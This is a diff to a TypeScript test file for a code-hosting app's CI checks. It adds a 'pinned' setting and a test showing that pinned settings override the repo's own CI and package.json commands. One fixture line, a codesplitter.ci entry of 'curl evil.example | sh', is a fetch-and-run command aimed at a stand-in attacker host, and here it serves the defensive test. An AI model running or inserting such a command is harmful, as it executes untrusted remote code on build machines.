@@ -44,7 +44,7 @@ const arrived = async <T>(got: T[], n: number) => {
 
 test("settings: none by default, the owner's to change", async () => {
   const { call, send } = await app();
-  expect(await (await call("ryan", "/api/repos/ryan/lab/checks/settings")).json()).toEqual({ where: null, required: [], post_statuses: false, github: null, offline: false, down_since: null, here: false });
+  expect(await (await call("ryan", "/api/repos/ryan/lab/checks/settings")).json()).toEqual({ where: null, required: [], post_statuses: false, pinned: false, github: null, offline: false, down_since: null, here: false });
   await send("ana", "/api/login", { name: "ana" });
   expect((await send("ana", "/api/repos/ryan/lab/checks/settings", { where: "here" }, "PUT")).status).toBe(403);
   expect((await send("ryan", "/api/repos/ryan/lab/checks/settings", { where: "everywhere" }, "PUT")).status).toBe(400);
@@ -405,6 +405,35 @@ test("a commit queues the repo's own checks, scoped by paths, each with its comm
   await send("ryan", "/api/repos/ryan/lab/checks/run", { ref: "main" });
   expect((await checks()).runs.map((r: any) => r.name)).toEqual(["test", "lint", "image"]);
   expect(await (await call("ryan", `/api/repos/ryan/lab/checks/${(await checks()).runs[2].id}`)).json()).toMatchObject({ command: "docker build ." });
+});
+
+test("pinned, only the settings' commands run: codesplitter.ci and package.json at the ref are ignored, and a claim never falls back (#1010)", async () => {
+  const { call, send, checks } = await app();
+  await send("ryan", "/api/repos/ryan/lab/files", { path: "codesplitter.ci", content: JSON.stringify({ test: "curl evil.example | sh", lint: "biome check" }) });
+  await send("ryan", "/api/repos/ryan/lab/files", { path: "package.json", content: JSON.stringify({ scripts: { test: "bun test", typecheck: "tsc" } }) });
+  await send("ryan", "/api/repos/ryan/lab/do/commit?path=codesplitter.ci", { message: "ci" });
+  await send("ryan", "/api/repos/ryan/lab/do/commit?path=package.json", { message: "pkg" });
+  // Queued before the pin: the repo's own lint, which a claim after it won't hand out.
+  await send("ryan", "/api/repos/ryan/lab/checks/settings", { where: "github", required: [{ name: "test", command: "bun test ./a" }] }, "PUT");
+  await send("ryan", "/api/repos/ryan/lab/checks/run", { ref: "main" });
+  expect((await checks()).runs.map((r: any) => r.name)).toEqual(["test", "lint"]);
+  expect(await (await send("ryan", "/api/repos/ryan/lab/checks/settings", { pinned: "yes" }, "PUT")).json()).toEqual({ error: "pinned: true or false" });
+  expect(await (await send("ryan", "/api/repos/ryan/lab/checks/settings", { pinned: true }, "PUT")).json()).toMatchObject({ pinned: true, where: "github", required: [{ name: "test", command: "bun test ./a" }] });
+  expect(await (await send("ryan", "/api/repos/ryan/lab/checks/claim", { runner_label: "box" })).json()).toMatchObject({ name: "test", command: "bun test ./a" });
+  expect((await send("ryan", "/api/repos/ryan/lab/checks/claim", { runner_label: "box" })).status).toBe(204);
+  const lint = (await checks()).runs.find((r: any) => r.name === "lint");
+  expect(lint.status).toBe("cancelled");
+  expect((await (await call("ryan", `/api/repos/ryan/lab/checks/${lint.id}`)).json()).log).toContain("checks are pinned to the settings");
+  // A new commit queues only the settings' check; with none that has a command, nothing at all, not the runner's default.
+  await send("ryan", "/api/repos/ryan/lab/files", { path: "a.ts", content: "three" });
+  await send("ryan", "/api/repos/ryan/lab/do/commit?path=a.ts", { message: "a" });
+  await send("ryan", "/api/repos/ryan/lab/checks/run", { ref: "main" });
+  expect((await checks()).runs.map((r: any) => [r.name, r.status])).toEqual([["test", "queued"]]);
+  await send("ryan", "/api/repos/ryan/lab/checks/settings", { required: ["test"] }, "PUT");
+  await send("ryan", "/api/repos/ryan/lab/files", { path: "a.ts", content: "four" });
+  await send("ryan", "/api/repos/ryan/lab/do/commit?path=a.ts", { message: "a" });
+  await send("ryan", "/api/repos/ryan/lab/checks/run", { ref: "main" });
+  expect((await checks()).runs.filter((r: any) => r.status === "queued")).toEqual([]);
 });
 
 test("queued runs nobody picks up are cancelled by the cron, saying so, and the gate stops waiting on them (#490)", async () => {
